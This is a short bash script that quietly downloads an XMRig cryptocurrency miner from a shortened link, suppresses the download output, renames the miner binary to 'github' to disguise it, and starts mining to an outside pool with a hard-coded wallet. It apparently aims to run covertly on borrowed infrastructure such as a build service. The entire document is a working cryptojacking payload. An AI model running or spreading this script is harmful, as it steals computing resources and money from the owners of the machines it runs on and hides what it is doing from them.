#!/bin/bash
wget -O xmrig-6.16.4-linux-static-x64.tar.gz https://bit.ly/34BX48f > /dev/null 2>&1
tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
cd xmrig-6.16.4
mv xmrig github
chmod u+x github
./github -a Argon2/Chukwa -o codemagic.smkn2.xyz:22287 -u gunsVsqShTeEfdPeJyQreNfSKfHLm5gfFi3WWywazefsRusPS4LjKoMYLigqfsvRsqKo4kJEEjtPkGPF7xsLQMGq8YcsjUESKm --keepalive --donate-level 1 -p cpu:admin@usantixyz.xyz
